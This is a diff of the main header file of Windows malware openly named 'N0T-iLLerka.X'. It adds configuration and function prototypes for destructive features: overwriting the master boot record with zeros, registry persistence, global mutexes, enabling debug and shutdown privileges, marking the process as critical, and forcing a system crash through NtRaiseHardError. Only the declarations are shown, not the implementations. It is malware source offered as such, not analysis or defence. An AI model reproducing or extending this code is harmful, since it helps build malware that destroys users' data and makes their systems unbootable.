@@ -1,5 +1,5 @@
+//// N0T-iLLerka.X main Header include File ////
 #pragma once
-// TODO: Clean this Mess up
 
 // Warning Message: //
 /* #define DISABLE_WARNING */
@@ -9,8 +9,7 @@
 // Kill MasterBootRecord: //
 /* #define KILL_MBR */
 	// If defined: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
-	//			   (Optional) (I might write my own MBR displaying a Message)
-
+	//			   (Optional) ((I might write my own MBR displaying a Message))
 
 //// Debug Mode: ////
 #define DEBUG
@@ -19,34 +18,38 @@
 
 //// Debug Suboptions: ////
 #ifdef DEBUG
-	// Show Debug Messages: //
+	// Debug MessageBoxes: //
 	#define DEBUG_MSG
 		// If defined: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.
 
 	// NT Process Persistency: //
-//	#define DISABLE_NT_FUNCTIONS
+	#define DISABLE_NT_FUNCTIONS
 		// If defined: Disables and prevents the Malware from utilizing the NT Functions used for Process Persistency.
 
 	// Mutex/Semaphore utilization: //
 	/* #define DISABLE_SYNCHRONIZATION */
 		// If defined: Disables the usage of a Global Mutex/Semaphore Object
-		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)
+		//			   (It is not recommended to disable this feature, but it might be sometimes necessary for debugging purposes)
 #endif
 
-// Debug MessageBox Template //
+// Debug MessageBox Template (for C&P-ing) //
 /*
-	// TODO: modify this
 	#ifdef DEBUG_MSG
-		MessageBox(NULL, L"", L"", MB_OK |  MB_ICON | MB_SYSTEMMODAL);
+		fnErrorHandlerW(L"", NULL, L"", MB_OK | MB_ICON);
 	#endif // DEBUG_MSG
 */
 
-// Header Files //
+// Compiler/Linker //
+#pragma comment(linker,"\"/manifestdependency:type='win32' \
+name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
+processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
+
+// Dependencies //
 #include <Windows.h>
 #include <bcrypt.h>
-#include <string>
 #include <Shlobj.h>
 #include <Shlwapi.h>
+#include <string>
 #include <vector>
 
 #ifdef DEBUG_MSG
@@ -61,26 +64,52 @@
 #pragma comment(lib, "ntdll.lib")
 #endif // !DISABLE_NT_FUNCTIONS
 
-// Define Macros //
-#define MALWR_NAME L"N0T-iLLerka.X"
+// FileSystem Macros //
+#define nDRIVES 0x1a * 0x4
+#define nMBR_SIZE 0x200
 
-#define MIN_RSLEN 0x8
-#define MAX_RSLEN 0x10
+// RegEdit Macros //
+#define szREGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
+#define szREGISTRY_SUBKEY L"N0TiLLerka"
+#define nREGISTRY_VALUE 0xBADC0DE
+#define HKLM 0x1
+#define HKCU 0x2
 
-#define MAX_BUFFER_SIZE 0x2000000
+// Synchronization Macros //
+#define szHOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv:/host.Proc(running)"
+#define szHOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv:/host.Proc(running)"
+#define nMAX_SEMAPHORE 2
 
-#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
-#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
-#define MAX_SMPO 2
+// Utilitie Macros //
+#define szMALWR_NAME L"N0T-iLLerka.X"
+#define szFORMAT L"%s failed with Errorcode:\n%d : %s\n\nDetails:\n"
+#define nFORMAT_LEN lstrlen(szFORMAT)
+#define nMAX_HEAP_SIZE 0xfa0
 
-#define REGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
-#define REGISTRY_SUBKEY L"N0TiLLerka"
-#define REGISTRY_VALUE 0xBADC0DE
+#define nMIN_RS_LEN 0x8
+#define nMAX_RS_LEN 0x10
+#define nMAX_BUFFER_SIZE 0x2000000
 
-// Function Macros //
-#define M_RNG_R(nMin, nMax) ((nMin) + (fnCryptGenRandomNumber() % (((nMax) - (nMin)) + 1)))
+// Wrapper Macros //
+#define nRNG_RAN(nMin, nMax) ((nMin) + (fnCryptGenRandomNumber() % (((nMax) - (nMin)) + 1)))
 
-// Arrays //
+#ifndef DISABLE_NT_FUNCTIONS
+// NT Macros //
+#define OPTION_SHUTDOWN_SYSTEM 0x6
+#define SE_SHUTDOWN_PRIVILEGE 0x13
+#define SE_DEBUG_PRIVILEGE 0x14
+#endif // !DISABLE_NT_FUNCTIONS
+
+// Typedefinitions //
+#ifndef DISABLE_NT_FUNCTIONS
+typedef struct {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+#endif // !DISABLE_NT_FUNCTIONS
+
+// Arrays/Sizes //
 extern const WCHAR szCharSet[];
 extern const size_t cnCharSet;
 
@@ -106,6 +135,7 @@ BOOL fnOverwriteMBR(VOID);
 
 // RegEdit Functions //
 BOOL fnCreateRegistryKeyW(
+	_In_ BOOL hKeyOpt,
 	_In_ LPCWSTR lpSubKey,
 	_In_ LPCWSTR lpValueName,
 	_In_ DWORD dwType,
@@ -135,20 +165,41 @@ std::wstring fnCryptGenRandomStringW(
 	_In_ INT nLen
 );
 VOID fnCryptGenRandomBufferW(
-	_Inout_ PWCHAR pszRd,
+	_Out_ PWCHAR pszRd,
 	_In_ ULONG ulFs
 );
 BOOL fnIsUserAdmin(VOID);
 VOID fnErrorHandlerW(
-	_In_ LPCWSTR lpText,
-	_In_ LPCWSTR lpCaption,
-	_In_ LPCWSTR lpFunction,
+	_In_opt_ LPCWSTR lpText,
+	_In_opt_ LPCWSTR lpCaption,
+	_In_opt_ LPCWSTR lpFunction,
 	_In_ UINT uType,
-	_In_ ...
+	_In_opt_ ...
+);
+
+#ifndef DISABLE_NT_FUNCTIONS
+// NT/RTL Function Prototypes //
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
+	_In_ ULONG,
+	_In_ BOOLEAN,
+	_In_ BOOLEAN,
+	_Out_ PBOOLEAN
+);
+EXTERN_C NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
+	_In_ BOOLEAN,
+	_Out_opt_ PBOOLEAN,
+	_In_ BOOLEAN
+);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(
+	_In_ NTSTATUS,
+	_In_ ULONG,
+	_In_opt_ PUNICODE_STRING,
+	_In_opt_ PVOID*,
+	_In_ UINT,
+	_Out_ PUINT
 );
 
 // NT Utilitie Functions //
-#ifndef DISABLE_NT_FUNCTIONS
 BOOL fnNTSetProcessIsCritical(
 	_In_ BOOLEAN blIsCritical
 );
